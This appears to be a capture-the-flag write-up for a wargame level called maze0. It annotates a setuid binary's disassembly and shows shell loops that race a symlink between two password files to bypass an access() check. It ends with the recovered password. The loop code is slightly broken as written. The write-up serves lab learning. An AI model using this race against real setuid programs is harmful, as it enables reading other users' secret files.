
/maze/maze0 has privileges of maze0 at the begining, and then it asks for more privilages 

Dump of assembler code for function main:
```assembly
   0x0804854b <+0>:	push   ebp
   0x0804854c <+1>:	mov    ebp,esp
   0x0804854e <+3>:	push   esi
   0x0804854f <+4>:	push   ebx
   0x08048550 <+5>:	sub    esp,0x18
   0x08048553 <+8>:	push   0x14
   0x08048555 <+10>:	push   0x0
   0x08048557 <+12>:	lea    eax,[ebp-0x20]
   0x0804855a <+15>:	push   eax
   0x0804855b <+16>:	call   0x8048420 <memset@plt>		#reset mem block of 20
   0x08048560 <+21>:	add    esp,0xc
   0x08048563 <+24>:	push   0x4				#R_OK mode --> read
   0x08048565 <+26>:	push   0x8048660
   0x0804856a <+31>:	call   0x8048430 <access@plt>		#try to access a file
   0x0804856f <+36>:	add    esp,0x8
   0x08048572 <+39>:	test   eax,eax
   0x08048574 <+41>:	jne    0x80485d4 <main+137>		#if not succsesful, exit...
   0x08048576 <+43>:	call   0x80483d0 <geteuid@plt>		#escalate privileges
   0x0804857b <+48>:	mov    esi,eax
   0x0804857d <+50>:	call   0x80483d0 <geteuid@plt>		#...
   0x08048582 <+55>:	mov    ebx,eax
   0x08048584 <+57>:	call   0x80483d0 <geteuid@plt>		#...
   0x08048589 <+62>:	push   esi
   0x0804858a <+63>:	push   ebx
   0x0804858b <+64>:	push   eax
   0x0804858c <+65>:	call   0x80483b0 <setresuid@plt>	#escalate
   0x08048591 <+70>:	add    esp,0xc
   0x08048594 <+73>:	push   0x0
   0x08048596 <+75>:	push   0x8048660
   0x0804859b <+80>:	call   0x80483f0 <open@plt>		#open the file
   0x080485a0 <+85>:	add    esp,0x8
   0x080485a3 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x080485a6 <+91>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080485aa <+95>:	jns    0x80485b3 <main+104>		#if succesful continue
   0x080485ac <+97>:	push   0xffffffff
   0x080485ae <+99>:	call   0x80483e0 <exit@plt>
   0x080485b3 <+104>:	push   0x13
   0x080485b5 <+106>:	lea    eax,[ebp-0x20]
   0x080485b8 <+109>:	push   eax
   0x080485b9 <+110>:	push   DWORD PTR [ebp-0xc]
   0x080485bc <+113>:	call   0x80483c0 <read@plt>		#read contents
   0x080485c1 <+118>:	add    esp,0xc
   0x080485c4 <+121>:	push   0x13
   0x080485c6 <+123>:	lea    eax,[ebp-0x20]
   0x080485c9 <+126>:	push   eax
   0x080485ca <+127>:	push   0x1
   0x080485cc <+129>:	call   0x8048410 <write@plt>		#write to stdout
   0x080485d1 <+134>:	add    esp,0xc
   0x080485d4 <+137>:	mov    eax,0x0
   0x080485d9 <+142>:	lea    esp,[ebp-0x8]
   0x080485dc <+145>:	pop    ebx
   0x080485dd <+146>:	pop    esi
   0x080485de <+147>:	pop    ebp
   0x080485df <+148>:	ret
   ```

file = /tmp/128ecf542a35ac5270a87dc740918404

well use a technique called "race condition",
we try to bypass the access() by:
creating ln -s to maze0 password
starting /maze/maze0 (on another procces)
changing ln -s to maze1 password

implementetion:
```sh
while [ 1 ];
do
/maze/maze0
done;
```
on another window:
```sh
while [ 1 ];
ln -s /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
ln -s /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
done;
```

we get:
hashaachon

